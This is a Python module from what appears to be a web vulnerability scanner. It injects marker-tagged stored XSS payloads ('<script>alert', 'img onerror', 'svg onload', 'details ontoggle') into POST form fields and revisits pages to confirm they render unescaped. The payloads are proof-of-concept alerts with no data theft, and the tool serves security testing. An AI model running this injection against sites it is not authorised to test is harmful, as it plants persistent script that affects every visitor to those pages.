"""
Stored XSS Verification Module
After injecting payloads, re-visits pages to detect stored XSS
that persists across requests.
"""

import time
import hashlib
import threading
from typing import List, Dict, Set
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin


# Unique markers for stored XSS detection
STORED_MARKER_PREFIX = "xSt0r3d"


class StoredXSSScanner:
    """Detects stored XSS by injecting unique markers and re-visiting pages"""

    def __init__(self, config, session: requests.Session):
        self.config = config
        self.session = session
        self.injected_markers: Dict[str, Dict] = {}  # marker -> injection details
        self.vulnerabilities: List[Dict] = []
        self._lock = threading.Lock()

    def generate_marker(self, url: str, param: str) -> str:
        """Generate a unique marker for tracking stored payloads"""
        unique = hashlib.md5(f"{url}:{param}:{time.time()}".encode()).hexdigest()[:8]
        return f"{STORED_MARKER_PREFIX}{unique}"

    def get_stored_payloads(self, url: str, param: str) -> List[Dict]:
        """
        Generate payloads with unique markers for stored XSS detection.
        Each payload contains a trackable marker.
        """
        marker = self.generate_marker(url, param)

        payloads = [
            {
                'payload': f'<script>alert("{marker}")</script>',
                'type': 'Stored XSS - Script',
                'severity': 'Critical',
                'marker': marker
            },
            {
                'payload': f'<img src=x onerror=alert("{marker}")>',
                'type': 'Stored XSS - Event Handler',
                'severity': 'Critical',
                'marker': marker
            },
            {
                'payload': f'<svg onload=alert("{marker}")>',
                'type': 'Stored XSS - SVG',
                'severity': 'Critical',
                'marker': marker
            },
            {
                'payload': f'"><script>alert("{marker}")</script>',
                'type': 'Stored XSS - Attr Break',
                'severity': 'Critical',
                'marker': marker
            },
            {
                'payload': f"<details open ontoggle=alert('{marker}')>",
                'type': 'Stored XSS - Details',
                'severity': 'Critical',
                'marker': marker
            },
        ]

        # Track all markers
        for p in payloads:
            self.injected_markers[p['marker']] = {
                'url': url,
                'parameter': param,
                'payload': p['payload'],
                'type': p['type'],
                'injection_time': datetime.now().isoformat()
            }

        return payloads

    def inject_payloads(self, injection_points: List[Dict]) -> int:
        """
        Inject stored XSS payloads into form inputs (POST endpoints).
        Returns number of successful injections.
        """
        injected_count = 0

        for point in injection_points:
            # Only target form inputs that accept POST (likely stored)
            if point.get('type') != 'form_input':
                continue
            if point.get('form_method', 'get') != 'post':
                continue

            url = point.get('url', '')
            form_action = point.get('form_action', '')
            param = point.get('parameter', '')

            payloads = self.get_stored_payloads(url, param)

            for payload_data in payloads:
                try:
                    data = {param: payload_data['payload']}
                    self.session.post(
                        form_action,
                        data=data,
                        timeout=self.config.timeout,
                        allow_redirects=True
                    )
                    injected_count += 1
                    time.sleep(self.config.delay)
                except Exception:
                    continue

        return injected_count

    def verify_stored_xss(self, urls_to_check: List[str]) -> List[Dict]:
        """
        Re-visit pages to check if injected markers appear unescaped.
        This is the verification phase that confirms stored XSS.
        """
        print(f"  {Fore.CYAN}[Stored XSS] Verifying {len(urls_to_check)} pages for stored payloads...{Style.RESET_ALL}")

        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = {
                executor.submit(self._check_page_for_markers, url): url
                for url in urls_to_check
            }

            for future in as_completed(futures):
                try:
                    vulns = future.result()
                    if vulns:
                        with self._lock:
                            self.vulnerabilities.extend(vulns)
                except Exception:
                    continue

        return self.vulnerabilities

    def _check_page_for_markers(self, url: str) -> List[Dict]:
        """Check a single page for any of our injected markers"""
        found = []

        try:
            response = self.session.get(url, timeout=self.config.timeout)
            body = response.text

            for marker, details in self.injected_markers.items():
                if marker in body:
                    # Check if marker is in an executable context (not escaped)
                    if self._is_marker_executable(body, marker):
                        found.append({
                            'type': details['type'],
                            'severity': 'Critical',
                            'url': url,
                            'parameter': details['parameter'],
                            'payload': details['payload'],
                            'method': 'POST',
                            'detection_method': 'Stored XSS Verification (marker found on re-visit)',
                            'injection_url': details['url'],
                            'timestamp': datetime.now().isoformat()
                        })

                        if self.config.verbose:
                            print(f"  {Fore.RED}[Stored XSS] CONFIRMED: Marker {marker} found at {url}{Style.RESET_ALL}")

        except Exception:
            pass

        return found

    def _is_marker_executable(self, body: str, marker: str) -> bool:
        """
        Check if the marker appears in an executable context
        (not HTML-escaped or inside a safe attribute).
        """
        # Find the marker position
        idx = body.find(marker)
        if idx == -1:
            return False

        # Get surrounding context
        start = max(0, idx - 200)
        context = body[start:idx + len(marker) + 100]

        # Check if it's inside a script tag or event handler
        executable_patterns = [
            r'<script[^>]*>[^<]*' + marker,
            r'onerror\s*=\s*["\']?[^"\']*' + marker,
            r'onload\s*=\s*["\']?[^"\']*' + marker,
            r'ontoggle\s*=\s*["\']?[^"\']*' + marker,
            r'alert\s*\(\s*["\']?' + marker,
        ]

        for pattern in executable_patterns:
            if re.search(pattern, context, re.IGNORECASE):
                return True

        # Check if the raw payload HTML is present (not entity-encoded)
        escaped_marker = marker.replace('<', '&lt;').replace('>', '&gt;')
        if escaped_marker in body and marker not in body.replace(escaped_marker, ''):
            return False  # It's escaped, not executable

        return True


# Need re import at module level
import re
